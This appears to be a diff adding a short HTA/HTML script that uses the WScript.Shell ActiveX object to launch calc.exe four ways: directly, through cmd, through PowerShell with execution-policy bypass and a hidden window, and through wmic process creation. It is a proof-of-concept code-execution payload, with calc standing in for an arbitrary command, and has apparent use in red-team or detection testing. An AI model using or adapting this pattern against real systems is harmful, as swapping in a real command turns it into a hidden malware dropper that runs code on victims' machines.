@@ -1,0 +1,7 @@
+<script>
+ao=new ActiveXObject("WScript.Shell");
+ao.run('%windir%\\System32\\' + "calc.exe", 0);window.close();
+ao.run('%windir%\\System32\\' + "cmd.exe" + ' /c calc', 0);window.close();
+ao.run('powershell -exec bypass -Noninteractive -windowstyle hidden -c calc', 0);window.close();
+ao.run('wmic process call create calc', 0);window.close();
+</script>
